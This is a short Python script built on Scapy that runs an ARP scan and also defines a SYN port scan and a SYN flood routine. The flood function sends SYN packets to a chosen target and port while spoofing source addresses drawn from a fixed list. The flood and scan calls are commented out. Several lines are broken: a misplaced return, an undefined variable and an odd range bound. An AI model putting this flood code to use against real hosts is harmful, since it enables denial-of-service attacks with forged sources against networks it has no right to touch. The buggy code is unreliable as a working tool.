from scapy.all import *
import random
def arp_scan(ip):
    answer, uanswer = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), inter=0.1, timeout=2, verbose=False)
    mac_list = []
    for send, recv in answer:
        if recv[ARP].op == 2:
            mac_list.append((recv[ARP].psrc, recv[Ether].hwsrc))
        return mac_list
def port_scan(port):
    answer, uanswer = sr(IP(dst="192.168.1.1") / fuzz(TCP(dport=int(port), flags="S")))
    for s, r in ans:
        if r[TCP].flags == 18:
            print("port is Open")
        if r[TCP].flags == 20:
            print("port is Closed")

def synFlood(tgt,dPort):
    srcList = ['201.1.1.2','10.1.1.102','69.1.1.2','125.130.5.199']
    for sPort in range(1-24,65535):
        index = random.randrange(4)
        ipLayer = IP(src = srcList[index], dst = tgt)
        tcpLayer = TCP(sport = sPort,dport = dPort,flags = "S")
        packet = ipLayer/tcpLayer
        send(packet)

if __name__ == '__main__':
    print(arp_scan("192.168.1.101"))
    # port_scan(80)
    # synFlood("192.168.1.100", 80)